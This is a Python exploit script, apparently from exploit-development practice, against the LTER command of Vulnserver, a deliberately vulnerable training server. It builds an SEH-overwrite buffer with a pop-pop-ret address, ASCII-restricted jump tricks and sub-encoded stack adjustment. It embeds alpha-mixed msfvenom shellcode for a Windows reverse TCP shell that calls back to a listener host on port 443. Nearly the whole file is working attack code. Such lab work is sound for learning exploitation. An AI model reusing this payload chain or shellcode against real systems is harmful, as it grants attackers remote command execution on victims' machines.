#!/usr/bin/python3

# ============================================
# Vulnserver LTER exploit via SEH
# ============================================

from pwn import *

# === Target info ===
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# === Initial Variables ===
vulncmd = b"LTER /.:/"  # this should cause the crash
crash = 4000  # a payload of this size triggers the crash
offset = 3515
junk = b"A" * offset

cyclic_pattern = cyclic_metasploit(4000)

# === SEH ===

nseh = b"\x74\x08\x75\x03" # Jump Net techique(JZ 0x8, JNZ 0x4). This will bypass ascii restrictions as well
seh = p32(0x6250160a)  # pop pop ret - find with !mona seh

# === Jumping to A buffer from the first small "island" ===
# === Sub encoding ===

adjstack = asm("push esp; pop eax; add ax, 0x135b; push eax; pop esp") # adjust the stack to the end of the program, which is 4955 bytes(135B) away)

abuffeax2ebx = asm("sub ax, 0x0c7b; sub ax, 0x017b; push eax; pop ebx") # put a buffer location inside ebx because we will fuck up eax later
callebx = asm("and eax, 0x554e4d4a; and eax, 0x2a313235; sub eax, 0x237f265e; sub eax, 0x2a7f7a4c; sub eax, 0x21707b57; push eax") # carve ffd3 to call eax at stack location

# Moving "A" buffer and ESP around
movestackup = asm("push ebx; pop eax; add al, 0x7f; push eax; pop esp;") # offset stack by 127 bytes from EBX location to get around stack overflow problem, 7f because no badchars
noops = b"\x47" * (127 - len(movestackup)) # noop sled using "inc edi" because 90 is a badchar


# === Payload ===

# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.145.1 LPORT=443 -f hex -b '\x00' -e x86/alpha_mixed BufferRegister=EBX
# using binascii because it makes the script look neater
shellcode = binascii.unhexlify("54594949494949494949494949494949494937515a6a415850304130416b41415132414232424230424241425850384142754a49696c39786c4233305550633043506e696a454561795070646c4b563046506c4b5052644c4c4b427267646e6b61626578444f6c77304a66467651396f6e4c574c3171716c4442346c45707a614a6f744d76616f3748626c32514270576e6b563244504e6b515a474c4e6b504c47614258386373787771685130516e6b7059375045516b634c4b726934583973556a70496e6b66544e6b56616e367651796f4e4c59514a6f344d46617a6770386b50525569665333716d3968474b334d346451654a4461484c4b636836447551694343564c4b544c426b4c4b5058654c57716a736c4b64444e6b66614e304b39673445743134336b636b61713279527a6361796f4d30514f736f714a4e6b6672786b4e6d614d753854737032477057705358616744335562736f36346538704c743737566777796f59454c786c5043315550777065797a6466343630717857594f70324b65504b4f6a75327066307270563051506630473046303178697a544f4b6f3970396f5a754f67735a677550684f3059386e71777172483772377075514d6b6f794976717a42306366527770684f696d7571643531696f69454f7549504344744c796f504e566852556a4c71786870583569327366796f694532485243506d617453306e696a4372775057514754717a56424a3232363971466a42696d7246595751544754774c577176616c4d5154713456704956455050447634663033663056763662665636526e305651467633363632484439784c656f6f76596f58556b396b50426e46367156596f5030724856684f77776d5350696f6a756d6b3970454d757a355a55386d764a354d6d6d4d4b4f7945656c5336334c766a6b30696b4970734564456f4b737772335252706f435a67705633596f48554141")
junk = b"A" * (offset - len(shellcode) - len(noops) - len(movestackup))

payload = b"".join([
    vulncmd,
    movestackup,
    noops,
    shellcode,
    junk,
    nseh,
    seh,
    b"\x47"*3, # "inc edi" add this in place of NOPs(bad char) because the jump is funky
    adjstack,
    abuffeax2ebx,
    callebx,
])

payload += b"\x47" * (crash - len(payload))  # padding

print("[+] Sending payload..")
s.send(payload)
print("[*] Payload sent!")
s.close()
